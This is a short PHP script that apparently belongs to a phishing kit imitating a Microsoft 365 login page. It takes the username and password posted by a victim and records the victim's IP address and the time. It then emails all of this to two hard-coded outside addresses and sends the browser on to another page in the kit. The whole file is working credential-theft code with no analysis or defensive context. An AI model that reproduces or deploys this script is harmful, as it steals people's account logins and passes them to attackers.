<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['username'];
$pass1 = $_POST['password'];
$chaseme="yunginxx@yandex.com,amillerbriggsfreemancom@gmail.com";


  $subj = "[File]  $ip";
  $msg = "365 Info\n\nUsername: $user1\nPassword: $pass1\n$ip $adddate\n-----------------------------------\n        Created By JaS\n-----------------------------------";
  $from = "From: <FIle>";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: 365.php");